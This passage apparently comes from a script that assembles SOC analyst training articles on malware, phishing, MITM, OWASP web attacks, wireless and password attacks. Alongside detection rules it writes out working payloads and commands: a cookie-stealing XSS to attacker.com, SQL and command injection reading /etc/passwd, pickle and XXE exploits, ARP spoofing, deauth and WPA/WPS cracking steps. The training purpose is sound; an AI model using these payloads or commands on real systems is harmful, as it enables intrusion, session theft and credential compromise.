at various privilege levels to avoid detection.

**Types by privilege level:**
- **User-mode rootkit** - Hooks API calls in user space (LD_PRELOAD, DLL injection)
- **Kernel-mode rootkit** - Loads as driver, modifies kernel structures (DKOM)
- **Bootkit** - Infects boot process (MBR/VBR/UEFI), loads before OS
- **Firmware rootkit** - Persists in BIOS/UEFI firmware (LoJax)
- **Hypervisor rootkit** - Runs beneath the OS as a thin hypervisor (Blue Pill concept)

**Detection strategies:**
```
# Cross-view detection: compare API results vs raw disk/memory
# Check for hidden processes
volatility -f memory.dmp --profile=Win10x64 psxview
# Check for SSDT hooks
volatility -f memory.dmp --profile=Win10x64 ssdt
# Verify driver signing
sigcheck -e -u C:\Windows\System32\drivers\*.sys
# Check for modified MBR
dd if=\\.\PhysicalDrive0 bs=512 count=1 | xxd | head
```

## Analysis Approach for SOC Analysts

| Step | Action | Tools |
|------|--------|-------|
| 1. Triage | Identify malware category from alerts | SIEM, EDR alerts |
| 2. Contain | Isolate affected host(s) | EDR isolation, VLAN change |
| 3. Collect | Gather samples, memory, logs | FTK Imager, KAPE, Velociraptor |
| 4. Analyze | Static + dynamic analysis | PE Studio, IDA, Any.Run, Joe Sandbox |
| 5. Identify IOCs | Extract hashes, IPs, domains, mutexes | YARA, strings, network captures |
| 6. Hunt | Search environment for related activity | EDR queries, SIEM correlation |
| 7. Remediate | Remove persistence, patch entry vector | GPO, SCCM, manual cleanup |
| 8. Report | Document findings and update detections | Incident report, YARA/Sigma rules |

## Key Takeaways

- Always classify malware type first; it determines your response playbook
- Worms require immediate network containment; trojans require C2 blocking
- Ransomware response prioritizes backup integrity and lateral movement prevention
- Rootkit detection requires tools that bypass normal OS APIs
- Keep sample hashes and submit to VirusTotal/MalwareBazaar for community intel
"""
    ))

    # ------------------------------------------------------------------
    # 2. Social Engineering Attacks and Defense
    # ------------------------------------------------------------------
    articles.append((
        "Social Engineering Attacks and Defense",
        ["attacks", "social-engineering", "phishing", "vishing", "smishing", "BEC", "defense"],
        r"""# Social Engineering Attacks and Defense

## Overview

Social engineering exploits human psychology rather than technical vulnerabilities.
It remains the most common initial access vector in breaches, with over 74% of
data breaches involving a human element according to the Verizon DBIR.

## Psychological Principles Exploited

| Principle | Description | Attack Example |
|-----------|-------------|----------------|
| Authority | Compliance with perceived authority | CEO impersonation email |
| Urgency | Pressure to act quickly | "Account suspended - act now" |
| Scarcity | Fear of missing out | "Limited time offer" links |
| Social proof | Following others' behavior | "500 colleagues already enrolled" |
| Reciprocity | Obligation to return favors | Free USB drives with malware |
| Familiarity | Trust in known entities | Spoofed emails from known contacts |
| Fear | Threat-based compliance | "Your account has been compromised" |

## Phishing Attack Types

### Email Phishing (Mass)
Untargeted campaigns sent to thousands of recipients using generic lures.

```
From: security@paypa1.com     <-- typosquatting domain
To: victim@company.com
Subject: Unusual Activity Detected - Verify Your Account

Dear Customer,
We detected unauthorized access to your account.
Click here to verify: hxxps://paypa1-secure[.]com/verify
```

**Detection indicators:**
- Sender domain mismatch or typosquatting
- Generic greeting ("Dear Customer")
- Urgency language
- Hover-over URL mismatch

### Spear Phishing
Targeted attacks using personalized information gathered from OSINT.

```
From: j.smith@partner-company.com (spoofed)
To: analyst@target-org.com
Subject: Re: Q3 Threat Assessment Report

Hi Sarah,
Following up on our conversation at the RSA conference.
Attached is the updated threat assessment we discussed.
[malicious_report_v2.docx]
```

### Whaling
Targets C-suite executives with business-relevant lures.

### Business Email Compromise (BEC)
Impersonates executives or vendors to redirect payments. BEC caused $2.7B in
losses in 2022 (FBI IC3 report).

**Common BEC scenarios:**
1. CEO fraud - "Wire $50K to this vendor urgently"
2. Vendor impersonation - Invoice with changed bank details
3. Payroll diversion - "Update my direct deposit info"
4. Attorney impersonation - Urgent legal matter requiring payment

### Vishing (Voice Phishing)
Phone-based social engineering, often combined with caller ID spoofing.

**Example script:**
```
"Hello, this is James from IT Support. We've detected malware on your
workstation and need to run a remote diagnostic. Can you install the
TeamViewer quick support tool? I'll walk you through it..."
```

### Smishing (SMS Phishing)
SMS-based phishing leveraging urgency and shortened URLs.

```
[ALERT] Your bank account has been locked due to suspicious activity.
Verify immediately: hxxps://bit[.]ly/3xF9kQ2
```

## Other Social Engineering Techniques

### Pretexting
Creating a fabricated scenario to extract information. The attacker builds a
believable identity and story to gain trust over time.

### Baiting
Offering something enticing (USB drives in parking lots, free software downloads)
that contains malware.

### Tailgating / Piggybacking
Following an authorized person through a secured door. Piggybacking implies
the authorized person is aware and allows it.

### Watering Hole
Compromising websites frequently visited by the target group, injecting exploit
code that targets visitors.

**Detection approach:**
```
# Monitor for drive-by download indicators
# Unexpected iframe injections on trusted sites
# Example Sigma rule for watering hole detection
title: Suspicious Script Execution After Browser Visit
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\chrome.exe'
            - '\firefox.exe'
            - '\msedge.exe'
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\cmd.exe'
            - '\wscript.exe'
            - '\mshta.exe'
    condition: selection_parent and selection_child
```

## Email Header Analysis for Phishing Detection

Key headers to examine:

```
Return-Path: <attacker@malicious-domain.com>
Received: from mail-server.malicious-domain.com (1.2.3.4)
From: "Trusted Sender" <trusted@legitimate.com>   <-- Display name spoofing
Reply-To: attacker@different-domain.com            <-- Mismatch
X-Originating-IP: [1.2.3.4]
Authentication-Results:
    spf=fail (sender IP not authorized)
    dkim=fail (signature verification failed)
    dmarc=fail (policy=reject)
Message-ID: <random@malicious-domain.com>
```

**Red flags checklist:**
- Return-Path differs from From address
- SPF/DKIM/DMARC failures
- Reply-To goes to different domain
- Received headers show unexpected origin
- Message-ID domain mismatch

## Defense Strategies

| Layer | Control | Description |
|-------|---------|-------------|
| Email Gateway | SPF/DKIM/DMARC | Authenticate sender domains |
| Email Gateway | Anti-phishing filters | URL/attachment sandboxing |
| Email Gateway | External email banners | Warn users of external origin |
| Endpoint | Browser isolation | Contain web-based threats |
| Endpoint | Macro restrictions | Block Office macros by default |
| Network | URL filtering | Block known malicious domains |
| Human | Security awareness training | Regular simulated phishing |
| Human | Reporting mechanism | Easy phishing report button |
| Process | Payment verification | Out-of-band approval for wire transfers |
| Process | MFA everywhere | Reduce credential theft impact |

## Metrics for SOC Teams

Track these to measure social engineering resilience:

- Phishing simulation click rate (target below 5%)
- Phishing report rate (target above 70%)
- Mean time to detect phishing campaign
- Mean time to contain (quarantine phishing emails)
- BEC attempts blocked vs successful
- Repeat clicker percentage

## Investigation Checklist

1. Extract and analyze email headers (SPF/DKIM/DMARC results)
2. Identify all recipients of the same campaign
3. Check if any users clicked links or opened attachments
4. Examine sandbox results for attachments/URLs
5. Search proxy logs for connections to phishing domains
6. Check for credential submission on phishing pages
7. Force password reset for compromised accounts
8. Block sender domain/IP at email gateway
9. Submit phishing URL to blocklist services
10. Document and report metrics
"""
    ))

    # ------------------------------------------------------------------
    # 3. Network Attacks MITM ARP Poisoning DNS Spoofing
    # ------------------------------------------------------------------
    articles.append((
        "Network Attacks MITM ARP Poisoning DNS Spoofing",
        ["attacks", "network", "MITM", "ARP-poisoning", "DNS-spoofing", "session-hijacking"],
        r"""# Network Attacks: MITM, ARP Poisoning, and DNS Spoofing

## Overview

Network-layer attacks intercept, modify, or redirect traffic between communicating
parties. Man-in-the-Middle (MITM) attacks are particularly dangerous because
victims often have no indication their traffic is being intercepted.

## Man-in-the-Middle (MITM) Attack Mechanics

In a MITM attack, the adversary positions themselves between two communicating
parties, secretly relaying and potentially altering communications.

```
Normal:    Client <-----------> Server
MITM:      Client <---> Attacker <---> Server
```

**MITM attack categories:**

| Category | Technique | Layer |
|----------|-----------|-------|
| LAN-based | ARP spoofing/poisoning | Layer 2 |
| LAN-based | DHCP spoofing | Layer 3 |
| DNS-based | DNS cache poisoning | Layer 7 |
| DNS-based | DNS spoofing (local) | Layer 7 |
| SSL/TLS | SSL stripping | Layer 7 |
| SSL/TLS | Certificate spoofing | Layer 7 |
| Wireless | Evil twin AP | Layer 2 |
| Routing | BGP hijacking | Layer 3 |

## ARP Spoofing / Poisoning

ARP has no authentication; any device can claim to own any IP address.

**Attack process:**
1. Attacker sends gratuitous ARP replies to victim: "Gateway IP is at MY MAC"
2. Attacker sends gratuitous ARP replies to gateway: "Victim IP is at MY MAC"
3. All traffic between victim and gateway flows through attacker
4. Attacker forwards traffic (maintaining connectivity) while capturing/modifying

**Tools:**
```bash
# Using arpspoof (dsniff suite)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1   # Poison victim
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100   # Poison gateway

# Using ettercap
ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# Enable IP forwarding to maintain connectivity
echo 1 > /proc/sys/net/ipv4/ip_forward
```

**Detection indicators:**
```
# Duplicate IP-to-MAC mappings in ARP table
arp -a | sort    # Look for same MAC on multiple IPs

# Wireshark filter for ARP anomalies
arp.duplicate-address-detected
arp.opcode == 2 && arp.src.proto_ipv4 == 192.168.1.1

# Snort/Suricata rule
alert arp any any -> any any (msg:"ARP Spoofing Detected";
    arp.opcode:2; threshold:type both, track by_src,
    count 30, seconds 5; sid:1000010; rev:1;)

# SIEM correlation: multiple MAC addresses for gateway IP
# IDS alert: gratuitous ARP flood from single source
```

**Prevention:**
- Static ARP entries for critical infrastructure (gateways, DNS servers)
- Dynamic ARP Inspection (DAI) on managed switches
- 802.1X port-based authentication
- VLAN segmentation to limit broadcast domains
- ARP monitoring tools (arpwatch, XArp)

## DNS Cache Poisoning

Corrupting a DNS resolver's cache to redirect queries to attacker-controlled IPs.

**Kaminsky attack (2008):**
1. Attacker queries resolver for random.target.com (not in cache)
2. Resolver queries authoritative NS for target.com
3. Attacker floods resolver with spoofed responses claiming to be authoritative
4. If attacker guesses correct transaction ID and source port, response is cached
5. Spoofed response includes glue record redirecting target.com NS to attacker

**Detection indicators:**
```
# Monitor DNS response anomalies
# High volume of DNS responses from unexpected sources
# DNS query/response ratio imbalance
# TTL anomalies in cached records

# Zeek DNS log analysis
cat dns.log | awk '$12 != "NOERROR" {print $9, $12}' | sort | uniq -c | sort -rn

# Sigma rule for DNS cache poisoning indicators
title: DNS Cache Poisoning Attempt
logsource:
    category: dns
detection:
    selection:
        query_type: 'A'
    filter_high_volume:
        src_ip|count() > 100
    timeframe: 1m
    condition: selection and filter_high_volume
```

**Prevention:**
- DNSSEC (DNS Security Extensions) - cryptographic signing of DNS records
- DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT)
- Source port randomization on resolvers
- Transaction ID randomization
- Response Rate Limiting (RRL) on authoritative servers

## SSL Stripping

Downgrading HTTPS connections to HTTP so the attacker can read plaintext traffic.

**Attack flow:**
```
1. Victim requests http://bank.com (or clicks HTTP link)
2. Attacker intercepts the request (via ARP spoof/MITM)
3. Attacker connects to bank.com over HTTPS
4. Attacker serves content to victim over HTTP
5. Victim sees no lock icon but content appears normal

Victim <--HTTP--> Attacker <--HTTPS--> Bank.com
```

**Tool:** sslstrip (Moxie Marlinspike)

**Detection:**
- Monitor for mixed HTTP/HTTPS sessions to sensitive sites
- HSTS preload violations
- Users reporting missing lock icons

**Prevention:**
- HTTP Strict Transport Security (HSTS) with preloading
- HSTS preload list inclusion
- Certificate pinning (mobile apps)

## Session Hijacking

Stealing or predicting session tokens to impersonate authenticated users.

**Techniques:**
- Session sniffing (unencrypted traffic)
- Cross-site scripting (XSS) to steal cookies
- Session fixation (forcing known session ID)
- Session prediction (weak random number generation)

**Detection indicators:**
```
# Same session ID used from different IP addresses
# Geographically impossible session IP changes
# Session activity after user logout
# Concurrent sessions from different user agents

# Web server log analysis
grep "SESSIONID=abc123" access.log | awk '{print $1}' | sort -u
# Multiple IPs using same session = hijacking indicator
```

## DHCP Spoofing

Rogue DHCP server provides victims with attacker-controlled gateway and DNS.

```
# Attacker runs rogue DHCP
# Offers: Gateway = attacker IP, DNS = attacker IP
# All victim traffic routes through attacker
# DNS queries go to attacker's DNS server

# Detection: monitor for multiple DHCP servers
# Prevention: DHCP snooping on switches
```

## Detection Summary Table

| Attack | Key Detection Method | Prevention |
|--------|---------------------|------------|
| ARP Spoofing | Duplicate MAC-to-IP, ARP flood | DAI, static ARP, 802.1X |
| DNS Poisoning | DNS response anomalies, TTL changes | DNSSEC, DoH/DoT |
| SSL Stripping | HTTP to sensitive sites, HSTS violations | HSTS preload |
| Session Hijack | Multi-IP sessions, impossible travel | Secure cookies, token binding |
| DHCP Spoofing | Multiple DHCP offers | DHCP snooping |
| BGP Hijacking | Route anomalies, RPKI invalid | RPKI, route filtering |

## SOC Analyst Response Checklist

1. Identify the attack type from IDS/network alerts
2. Determine affected network segment and scope
3. Capture traffic (pcap) for evidence before containment
4. Isolate attacker's device if identified on LAN
5. Flush ARP/DNS caches on affected systems
6. Verify gateway and DNS server MAC/IP integrity
7. Check for credential exposure during MITM window
8. Force password resets for affected sessions
9. Implement preventive controls (DAI, DHCP snooping, DNSSEC)
10. Update network monitoring rules based on findings
"""
    ))

    # ------------------------------------------------------------------
    # 4. Web Application Attacks OWASP Top 10
    # ------------------------------------------------------------------
    articles.append((
        "Web Application Attacks OWASP Top 10",
        ["attacks", "web-application", "OWASP", "SQLi", "XSS", "SSRF", "CSRF", "injection"],
        r"""# Web Application Attacks: OWASP Top 10

## Overview

Web applications are the primary attack surface for most organizations. The OWASP
Top 10 represents the most critical web application security risks. SOC analysts
must understand these attacks to detect exploitation attempts and investigate
web-based incidents.

## OWASP Top 10 (2021) Quick Reference

| Rank | Category | Description |
|------|----------|-------------|
| A01 | Broken Access Control | Unauthorized access to resources |
| A02 | Cryptographic Failures | Exposure of sensitive data |
| A03 | Injection | SQLi, XSS, command injection |
| A04 | Insecure Design | Flawed architecture/logic |
| A05 | Security Misconfiguration | Default creds, verbose errors |
| A06 | Vulnerable Components | Outdated libraries/frameworks |
| A07 | Auth & Session Failures | Broken authentication |
| A08 | Software/Data Integrity | Insecure CI/CD, deserialization |
| A09 | Logging & Monitoring Failures | Insufficient detection |
| A10 | SSRF | Server-Side Request Forgery |

## SQL Injection (SQLi)

Injecting SQL commands through user input to manipulate database queries.

**Types:**
- **In-band (Classic)** - Results returned in application response
- **Error-based** - Database errors reveal information
- **Union-based** - UNION SELECT to extract data from other tables
- **Blind (Boolean)** - True/false responses infer data
- **Blind (Time-based)** - Response delays infer data
- **Out-of-band** - Data exfiltrated via DNS/HTTP to attacker server

**Example payloads:**
```sql
-- Authentication bypass
' OR 1=1 --
' OR 'a'='a
admin' --

-- Union-based extraction
' UNION SELECT username, password FROM users --
' UNION SELECT null, table_name FROM information_schema.tables --

-- Time-based blind
' OR IF(1=1, SLEEP(5), 0) --
'; WAITFOR DELAY '0:0:5' --

-- Stacked queries (if supported)
'; DROP TABLE users; --
```

**WAF log detection patterns:**
```
# ModSecurity / WAF alerts
[msg "SQL Injection Attack"] [data "' OR 1=1"]
[severity "CRITICAL"] [uri "/login"]

# Web server access log patterns to hunt for
GET /search?q=%27%20OR%201%3D1%20--
POST /login HTTP/1.1  (body contains: username=admin'+OR+'1'%3D'1)

# Sigma rule for SQLi detection
title: SQL Injection Attempt in Web Logs
logsource:
    category: webserver
detection:
    keywords:
        - "' OR "
        - "1=1"
        - "UNION SELECT"
        - "SLEEP("
        - "WAITFOR"
        - "information_schema"
    condition: keywords
```

## Cross-Site Scripting (XSS)

Injecting malicious scripts into web pages viewed by other users.

**Types:**
- **Reflected** - Payload in URL parameter, reflected in response
- **Stored** - Payload saved in database, served to all viewers
- **DOM-based** - Payload processed by client-side JavaScript

**Example payloads:**
```html
<!-- Basic reflected XSS -->
<script>alert('XSS')</script>

<!-- Cookie theft -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

<!-- Event handler bypass -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- DOM-based -->
<script>eval(location.hash.substr(1))</script>
```

**Detection in logs:**
```
# URL-encoded script tags in request parameters
%3Cscript%3E
%3Csvg%20onload
javascript%3A

# CSP violation reports (if Content-Security-Policy reporting enabled)
{"csp-report": {"violated-directive": "script-src", "blocked-uri": "inline"}}
```

## Server-Side Request Forgery (SSRF)

Tricking the server into making requests to unintended destinations,
often targeting internal services or cloud metadata endpoints.

**Attack scenarios:**
```
# Accessing cloud metadata (AWS)
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Internal service scanning
GET /fetch?url=http://192.168.1.1:8080/admin

# File read via file protocol
GET /fetch?url=file:///etc/passwd

# DNS rebinding to bypass allowlists
GET /fetch?url=http://attacker-domain.com/  (DNS resolves to 127.0.0.1)
```

**Detection:**
```
# Monitor outbound requests from web servers to:
# - Internal IP ranges (10.x, 172.16-31.x, 192.168.x)
# - Cloud metadata IPs (169.254.169.254)
# - localhost/127.0.0.1
# WAF rules blocking metadata endpoint access in URL parameters
```

## Cross-Site Request Forgery (CSRF)

Forcing authenticated users to perform unintended actions via crafted requests.

```html
<!-- Hidden form that auto-submits -->
<form action="https://bank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

**Prevention:** Anti-CSRF tokens, SameSite cookies, origin header validation.

## Command Injection

Injecting OS commands through application inputs.

```bash
# Vulnerable code: os.system("ping " + user_input)
# Payload:
; cat /etc/passwd
| whoami
`whoami`
$(id)

# Example in URL
GET /status?host=8.8.8.8%3B+cat+/etc/passwd
```

## Path Traversal

Accessing files outside the intended directory.

```
GET /download?file=../../../etc/passwd
GET /download?file=....//....//....//etc/passwd
GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

## Insecure Deserialization

Manipulating serialized objects to achieve code execution.

```python
# Python pickle deserialization RCE
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('whoami',))
pickle.dumps(Exploit())

# Java deserialization (ysoserial)
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64
```

## XML External Entity (XXE)

Exploiting XML parsers that process external entity declarations.

```xml
<!--?xml version="1.0"?-->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

## Detection Strategy for SOC Analysts

| Attack | WAF Signature | Log Indicator | SIEM Rule |
|--------|--------------|---------------|-----------|
| SQLi | SQL keywords in params | 500 errors after input | Multiple SQLi patterns from 1 IP |
| XSS | Script tags in params | CSP violations | Script injection attempts |
| SSRF | Internal IPs in params | Outbound to metadata IP | Server requesting internal ranges |
| CSRF | Missing CSRF token | Unexpected POST from referrer | N/A (mostly prevention) |
| Command Inj | Shell metacharacters | Unexpected process spawns | Web server spawning shells |
| Path Traversal | ../ sequences | File access outside webroot | Directory traversal patterns |
| XXE | DOCTYPE/ENTITY | Outbound from XML parser | XML parsing with external entities |

## Key Investigation Steps

1. Correlate WAF alerts with web server access logs
2. Identify the specific vulnerability being targeted
3. Determine if exploitation was successful (response codes, data exfil)
4. Trace attacker IP and session across all logs
5. Check for lateral movement post-exploitation
6. Assess data exposure scope
7. Patch the vulnerability and deploy WAF rules
"""
    ))

    # ------------------------------------------------------------------
    # 5. Wireless Network Attacks and Defense
    # ------------------------------------------------------------------
    articles.append((
        "Wireless Network Attacks and Defense",
        ["attacks", "wireless", "wifi", "evil-twin", "deauth", "rogue-AP", "WPA"],
        r"""# Wireless Network Attacks and Defense

## Overview

Wireless networks extend the attack surface beyond physical boundaries. Attackers
within radio range can intercept traffic, impersonate access points, and exploit
protocol weaknesses. SOC analysts must understand wireless threats to detect rogue
infrastructure and respond to wireless-based incidents.

## Wireless Security Protocol Evolution

| Protocol | Year | Encryption | Key Length | Status |
|----------|------|-----------|------------|--------|
| WEP | 1997 | RC4 | 40/104-bit | Broken - never use |
| WPA | 2003 | TKIP/RC4 | 128-bit | Deprecated |
| WPA2-Personal | 2004 | AES-CCMP | 128-bit | Acceptable with strong PSK |
| WPA2-Enterprise | 2004 | AES-CCMP | 128-bit | Recommended |
| WPA3-Personal | 2018 | AES-CCMP/GCMP | 128/256-bit | Preferred (SAE handshake) |
| WPA3-Enterprise | 2018 | AES-GCMP | 192/256-bit | Best available |

## Evil Twin Attack

Attacker creates a rogue AP with the same SSID as a legitimate network to
intercept client connections.

**Attack process:**
1. Attacker identifies target SSID and channel
2. Creates AP with identical SSID using stronger signal
3. Optionally deauths clients from legitimate AP
4. Clients reconnect to evil twin (stronger signal)
5. Attacker captures all traffic, may present captive portal for credentials

**Tools:**
```bash
# Create evil twin with hostapd
# hostapd.conf:
interface=wlan0
driver=nl80211
ssid=Corporate-WiFi
hw_mode=g
channel=6

# Start rogue AP
hostapd hostapd.conf

# Start DHCP server for clients
dnsmasq --interface=wlan0 --dhcp-range=192.168.1.10,192.168.1.100

# Capture traffic
tcpdump -i wlan0 -w evil_twin_capture.pcap
```

**Detection:**
- Wireless IDS detecting duplicate SSIDs from different BSSIDs
- MAC address mismatch for known APs
- Signal strength anomalies (unexpected strong signal)
- Clients connecting to unknown BSSIDs

## Deauthentication Attack

Exploits 802.11 management frames (unencrypted in pre-WPA3) to forcibly
disconnect clients from access points.

```bash
# Using aireplay-ng
# Deauth all clients from AP
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth specific client
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

**Uses in attack chains:**
- Force reconnection to evil twin
- Capture WPA handshake for offline cracking
- Denial of service against wireless clients
- Force client to fall back to weaker security

**Detection:**
```
# WIDS alert: high volume of deauth frames
# Wireshark filter for deauth frames
wlan.fc.type_subtype == 0x000c

# Kismet WIDS alerts
ALERT: DEAUTHFLOOD - Deauthentication flood detected
ALERT: BSSTIMESTAMP - BSS timestamp mismatch (evil twin indicator)
```

**Prevention:** WPA3 Protected Management Frames (PMF / 802.11w)

## WPA/WPA2 Handshake Cracking

Capturing the 4-way handshake and cracking the pre-shared key offline.

```bash
# 1. Enable monitor mode
airmon-ng start wlan0

# 2. Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 3. Deauth to force handshake (separate terminal)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 4. Crack with dictionary
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# 5. Or use hashcat (GPU-accelerated)
# Convert capture to hashcat format
hcxpcapngtool -o hash.22000 capture-01.cap
hashcat -m 22000 hash.22000 rockyou.txt
```

## WPS (Wi-Fi Protected Setup) Attack

WPS PIN is only 8 digits with a checksum, reducing to ~11,000 combinations.

```bash
# Reaver - brute force WPS PIN
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Pixie Dust attack (offline PIN recovery)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1
```

**Prevention:** Disable WPS on all access points.

## KRACK (Key Reinstallation Attack)

Discovered in 2017, KRACK exploits the WPA2 4-way handshake to reinstall
an already-in-use key, resetting nonces and enabling decryption.

**Impact:** Allows decryption of frames, TCP hijacking, and content injection
on WPA2-protected networks.

**Mitigation:** Patch clients and APs; WPA3 is not vulnerable to KRACK.

## Rogue Access Point Detection

| Detection Method | Implementation | Effectiveness |
|-----------------|----------------|---------------|
| Wireless IDS/IPS | Dedicated sensors (Cisco CleanAir, Aruba RFProtect) | High |
| MAC allow-listing | Only authorized AP MACs | Medium (spoofable) |
| 802.1X RADIUS | Certificate-based auth | High |
| NAC Integration | Detect unauthorized wireless devices on wired network | High |
| RF Monitoring | Continuous spectrum analysis | High |
| Periodic scanning | Scheduled warwalks with tools | Low-Medium |

## Wardriving

Systematic discovery of wireless networks by driving with scanning equipment.

**Tools:** Kismet, Wigle WiFi, Aircrack-ng suite

**What attackers gather:**
- SSID names and encryption types
- BSSID (AP MAC addresses)
- GPS coordinates
- Signal strength (proximity estimation)
- Client probe requests (device tracking)

## Secure Wireless Architecture

```
                    +------------------+
                    |  RADIUS Server   |
                    | (802.1X / EAP)   |
                    +--------+---------+
                             |
                    +--------+---------+
     Internet -----+    Firewall       |
                    +--------+---------+
                             |
                    +--------+---------+
                    | Wireless         |
                    | Controller       |
                    +--+-----+-----+--+
                       |     |     |
                    +--+  +--+  +--+--+
                    |AP1| |AP2| |AP3  |
                    +---+ +---+ +-----+

    - WPA3-Enterprise with EAP-TLS (certificate-based)
    - 802.1X authentication via RADIUS
    - Wireless controller for centralized management
    - WIDS/WIPS enabled on all APs
    - Guest network on separate VLAN
    - Client isolation enabled
    - PMF (802.11w) mandatory
```

## SOC Wireless Monitoring Checklist

1. Deploy wireless IDS sensors covering all physical areas
2. Maintain inventory of authorized APs (BSSID allowlist)
3. Alert on new SSIDs matching corporate naming patterns
4. Monitor for deauth frame floods
5. Track rogue AP incidents and physical locations
6. Review wireless controller logs daily
7. Verify WPA3/PMF deployment status
8. Audit guest network isolation quarterly
9. Monitor for unauthorized wireless bridges
10. Correlate wireless events with wired network logs
"""
    ))

    # ------------------------------------------------------------------
    # 6. Password Attacks
    # ------------------------------------------------------------------
    articles.append((
        "Password Attacks Brute Force Dictionary Rainbow Tables",
        ["attacks", "passwords", "brute-force", "credential-stuffing", "rainbow-tables", "hash-cracking"],
        r"""# Password Attacks: Brute Force, Dictionary, and Rainbow Tables

## Overview

Password attacks remain one of the most effective methods for gaining unauthorized
access. Understanding the mechanics of password attacks helps SOC analysts detect
ongoing attacks, assess exposure after breaches, and recommend stronger controls.

## Online vs Offline Attacks

| Aspect | Online Attack | Offline Attack |
|--------|--------------|----------------|
| Target | Live authentication service | Stolen password hashes |
| Speed | Slow (network + lockout) | Very fast (GPU-limited) |
| Detection | Easy (failed login logs) | Invisible to defenders |
| Prevention | Lockout, MFA, rate limiting | Strong hashing, salting |
| Examples | Brute force login, spraying | Hashcat, John the Ripper |

## Brute Force Attacks

Systematically trying every possible character combination.

**Time to crack (8-character password):**

| Character Set | Combinations | Time (10B hashes/sec) |
|---------------|-------------|----------------------|
| Lowercase only (26) | 208 billion | ~21 seconds |
| Lower + upper (52) | 53 trillion | ~1.5 hours |
| Alphanumeric (62) | 218 trillion | ~6 hours |
| All printable (95) | 6.6 quadrillion | ~7.6 days |

**Detection (online brute force):**
```
# Windows Event Log - failed logins from single source
Event ID 4625 (Logon Failure) - multiple from same source IP

# Linux auth.log
grep "Failed password" /var/log/auth.log | awk '{print $11}' |
    sort | uniq -c | sort -rn | head

# Sigma rule for brute force detection
title: Multiple Failed Logins From Single Source
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4625
    timeframe: 5m
    condition: selection | count(TargetUserName) by IpAddress > 10
level: medium
```

## Dictionary Attacks

Using wordlists of common passwords and variations.

**Common wordlists:**
- rockyou.txt (14 million passwords from 2009 breach)
- SecLists (multiple curated lists)
- CrackStation (1.4 billion entries)
- Custom wordlists from OSINT on target organization

**Rule-based mutations:**
```
# Hashcat rules transform dictionary words
password -> Password, PASSWORD, p@ssword, password1, password!
# Example hashcat rule file
:         # original word
u         # uppercase all
c         # capitalize first
sa@       # substitute a->@
se3       # substitute e->3
$1        # append 1
$!        # append !
```

## Credential Stuffing

Using credentials leaked from one breach to attack other services,
exploiting password reuse across platforms.

**Scale:** Billions of credentials available from past breaches
(Collection #1-5, LinkedIn, Adobe, etc.)

**Detection:**
```
# Indicators of credential stuffing:
# - High volume of failed logins across MANY different accounts
# - Login attempts from known bot infrastructure IPs
# - Distributed source IPs (botnet-driven)
# - Success rate of 0.1-2% (some accounts reuse passwords)

# WAF/Application log patterns
# Multiple usernames, same password pattern
# Automated user-agent strings
# Rapid sequential login attempts
```

## Password Spraying

Trying a few common passwords against many accounts to avoid lockout.

```
# Strategy: try 1-2 passwords per account per lockout window
# Common passwords tried:
# Season+Year (Winter2026!, Summer2025!)
# Company+Number (Acme2026!)
# Welcome1!, Password1, Changeme1

# Detection: many accounts, few failures each, same password
# Sigma rule
title: Password Spray Attack
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4625
        LogonType: 3
    timeframe: 30m
    condition: selection | count(TargetUserName) by SubjectUserName > 20
```

## Rainbow Tables

Precomputed lookup tables mapping hashes to plaintext passwords.

**How they work:**
1. Pre-generate hash chains covering a character space
2. Store chain start and end points (not full chains)
3. To crack: compute chain from target hash, look up endpoint
4. If found, regenerate chain from start point to find plaintext

**Limitations:**
- Defeated by salted hashes (each salt needs its own table)
- Storage-intensive (terabytes for full coverage)
- Only works for specific hash algorithms

**Why salting defeats rainbow tables:**
```
# Without salt:
MD5("password") = 5f4dcc3b5aa765d61d8327deb882cf99
# Same hash every time - rainbow table lookup works

# With salt (random per user):
MD5("a1b2c3d4" + "password") = 7c6a180b36896a65c4c202c1507df2b8
MD5("e5f6g7h8" + "password") = 9f86d081884c7d659a2feaa0c55ad015
# Different hash each time - rainbow table useless
```

## Hash Cracking Tools

| Tool | Type | Strength |
|------|------|----------|
| Hashcat | GPU-based | Fastest, supports 300+ hash types |
| John the Ripper | CPU/GPU | Flexible rules, auto-detect hash type |
| Ophcrack | Rainbow table | Fast for unsalted LM/NTLM |
| CrackStation | Online lookup | 15 billion entry database |

**Hashcat examples:**
```bash
# Crack NTLM hashes with dictionary + rules
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r best64.rule

# Crack WPA2 handshake
hashcat -m 22000 capture.22000 wordlist.txt

# Brute force 8-char passwords
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# Benchmark hash speeds
hashcat -b
# NTLM:     ~100 GH/s (RTX 4090)
